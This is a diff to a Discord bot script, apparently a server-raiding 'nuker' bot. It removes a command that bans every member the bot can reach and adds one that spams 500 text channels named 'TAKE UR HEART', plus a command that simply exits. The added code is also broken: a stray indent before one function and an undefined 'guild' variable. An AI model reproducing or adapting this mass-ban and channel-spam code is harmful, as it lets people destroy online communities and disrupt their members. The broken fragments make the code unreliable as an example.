@@ -27,11 +27,14 @@ async def clear(ctx):
 
       
 @client.command()
-async def ban(ctx):
-   for member in client.get_all_members():
-        if member.bot and SKIP_BOTS:
-           continue
-        await member.ban(reason="Banned by BanBot", delete_message_days=7)
+async def overheat(ctx):
+  await ctx.message.delete()
+  exit()
+  
+@client.command()
+ async def create(ctx):
+    for i in range(500):
+      await guild.create_text_channel('TAKE UR HEART')
     
     
 client.run(os.environ['token'])
